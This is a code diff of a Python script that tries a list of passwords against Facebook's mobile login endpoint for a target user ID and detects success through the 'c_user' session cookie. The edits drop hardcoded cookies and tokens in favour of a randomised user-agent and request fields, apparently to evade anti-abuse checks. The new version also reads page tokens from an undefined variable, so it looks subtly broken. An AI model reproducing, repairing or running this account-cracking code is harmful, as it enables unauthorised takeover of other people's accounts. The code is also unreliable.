@@ -1512,67 +1512,58 @@ def x(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            head = {"accept": "*/*", "user-agent": "Mozilla/5.0 (Linux; Android 7.1.1; KirinX Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9, en-US,en;q=0.8", "x-requested-with": "XMLHttpCanary", "priority": "u=1, i"} 
             free_fb = Session.get('https://touch.facebook.com').text
-            cookies = {
-            'datr': '03bvaOa_R4DZ1wW8UJxIiEDs',
-            'sb': '03bvaFFplHLkXnHEAESMiPCm',
-            'm_pixel_ratio': '2.4749999046325684',
-            'wd': '437x973',
-            'fr': '0lkF7yjufUgsXxPhO..Bo73bT..AAA.0.0.Bo73fk.AWeZ4MTeFN4tM55x_-isIFj2g-8',}
             headers = {
-            'authority': 'mbasic.facebook.com',
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://mbasic.facebook.com',
-            'referer': 'https://mbasic.facebook.com/',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
+            'Host': 'free.facebook.com',
+            # 'content-length': str(len(str(data))), # Content-length is usually set by requests
+            'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"V2060"',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"13.0.0"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 13; V2060) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
-            'x-asbd-id': '359341',
+            'user-agent': ____PO_CO____(), # Using the dynamic UA generator
+            'x-response-format': 'JSONStream',
+            'content-type': 'application/x-www-form-urlencoded',
             'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'viewport-width': '360',
             'x-requested-with': 'XMLHttpRequest',
-            'x-response-format': 'JSONStream',}
+            'x-asbd-id': '129477',
+            'dpr': '2',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua-platform': '"Android"',
+            'accept': '*/*',
+            'origin': 'https://free.facebook.com',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
             data = {
-            "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number": "0",
-            "unrecognized_tries": "0",
-            "email": uid,
-            "prefill_contact_point": "",
-            "prefill_source": "",
-            "prefill_type": "",
-            "first_prefill_source": "",
-            "first_prefill_type": "",
-            "had_cp_prefilled": "false",
-            "had_password_prefilled": "false",
-            "is_smart_lock": "false",
-            "bi_xrwh": "0",
-            "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
-            "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            "fb_dtsg": "NAfuViwnKKdLlz3lmAMcKzAMCkWLVz_o2VJh9gO2FnHyeponfBuD-9A:0:0",
-            "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "dyn": "1KQdAG1mws8-t0BBBzEnwSwgE98nwgU2owpUuwcC4o1nEhw23E52q1ew6ywaq1Jw20Ehw73wGwcq0RE1u81x82ew5fw5NyE1582ZwrU2pw4swSw7zwde0UE",
-            "csr": "",
-            "hsdp": "",
-            "hblp": "",
-            "sjsp": "",
-            "req": "5",
-            "fmt": "1",
-            "a": "AYyZcK4ZvpkYTTWjFIMgVOVAexronVEBw4gB9FTdeTtqJBi2RtTsfJAPF0RwJJkAVIAYyMgTNGqC2mhJY7_0qFzXrPczRf5V_uU",
-            "__user": "0",}
+            'm_ts': re.search('name="m_ts" value="(.*?)"', str(requu1.text)).group(1),
+            'li': re.search('name="li" value="(.*?)"', str(requu1.text)).group(1),
+            'try_number': '0',
+            'unrecognized_tries': '0',
+            'email': uid,
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'prefill_type': '',
+            'first_prefill_source': '',
+            'first_prefill_type': '',
+            'had_cp_prefilled': 'false',
+            'had_password_prefilled': 'false',
+            'is_smart_lock': 'false',
+            'bi_xrwh': '0',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+            'bi_wvdp': '',
+            'fb_dtsg': '',
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(requu1.text)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(requu1.text)).group(1),
+            '__dyn': '',
+            '__csr': '',
+            '__req': random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]),
+            '__fmt': '0',
+            '__a': '',
+            '__user': '0'}
             url = "https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            response = Session.post(url, cookies=cookies, headers=headers, data=data, allow_redirects=True, timeout=30)
+            response = Session.post(url, data=data, headers=headers, allow_redirects=True, timeout=30)
             cok = Session.cookies.get_dict()
             if "c_user" in cok:
                 cid = cok["c_user"]
